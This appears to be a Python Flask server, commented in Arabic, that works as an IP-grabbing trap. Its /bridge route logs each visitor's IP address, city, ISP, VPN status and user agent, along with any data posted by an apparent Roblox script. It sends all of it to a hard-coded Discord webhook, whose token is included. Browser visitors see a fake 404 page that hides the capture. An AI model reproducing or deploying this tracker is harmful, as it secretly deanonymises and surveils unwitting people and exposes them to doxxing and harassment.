from flask import Flask, request, jsonify
import requests
import time

app = Flask(__name__)

# --- الإعدادات ---
# ضع رابط الويب هوك الخاص بك هنا
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1475965729932050503/oSnlVaHFmJ8Xlcd7opMtU2YtJUsSytKTL2gS1GwhJGTPgM8xxQKXgbgObzaku3ovYis0"
COOLDOWN_SECONDS = 4
last_sent_time = 0

def get_detailed_geo(ip):
    try:
        # فحص الـ IP لجلب الموقع وشركة الاتصالات وهل هو VPN أم لا
        res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,city,isp,proxy,hosting").json()
        return res
    except:
        return None

def send_to_discord(title, color, extra_data=None):
    global last_sent_time
    current_time = time.time()
    
    # استخراج الـ IP من الريكوست (الرابط يسوي كل شيء)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    geo = get_detailed_geo(ip)
    
    # بناء رسالة الديسكورد
    payload = {
        "username": "Web Guard Proxy",
        "embeds": [{
            "title": title,
            "color": color,
            "fields": [
                {"name": "🌐 الـ IP المقفوط", "value": f"**{ip}**", "inline": True},
                {"name": "📍 الموقع", "value": f"{geo.get('country', 'Unknown')}/{geo.get('city', 'Unknown')}", "inline": True},
                {"name": "🛡️ VPN/Proxy?", "value": "نعم ✅" if geo and (geo.get('proxy') or geo.get('hosting')) else "لا ❌", "inline": True},
                {"name": "🏢 شركة الاتصالات (ISP)", "value": f"`{geo.get('isp', 'Unknown')}`", "inline": False},
                {"name": "💻 بصمة الجهاز", "value": f"```\n{user_agent}\n```", "inline": False}
            ],
            "footer": {"text": f"توقيت العملية: {time.ctime()}"}
        }]
    }

    if extra_data:
        payload["embeds"][0]["fields"].append({"name": "📦 بيانات السكربت (Data)", "value": f"```json\n{extra_data}\n```", "inline": False})

    requests.post(DISCORD_WEBHOOK_URL, json=payload)
    last_sent_time = current_time

# المسار الأساسي (لو أحد دخل الموقع بدون /bridge)
@app.route('/')
def home():
    return "<h1>Server is Running</h1>", 200

# المسار الخاص بالفخ والسكربت
@app.route('/bridge', methods=['GET', 'POST'])
def bridge():
    global last_sent_time
    # نظام الكولد داون
    if time.time() - last_sent_time < COOLDOWN_SECONDS:
        return jsonify({"error": "cooldown"}), 429

    if request.method == 'POST':
        # لو الطلب جاي من سكربت روبلوكس
        data = request.json or {}
        send_to_discord("🚀 ريكوست جديد (POST Method)", 16711680, extra_data=data)
        return jsonify({"status": "success"}), 200
    else:
        # لو الطلب جاي من متصفح (زيارة عادية)
        send_to_discord("👀 قفط زيارة متصفح (GET Method)", 3447003)
        return "<h1>404 Not Found</h1>", 404

if __name__ == '__main__':
    app.run()
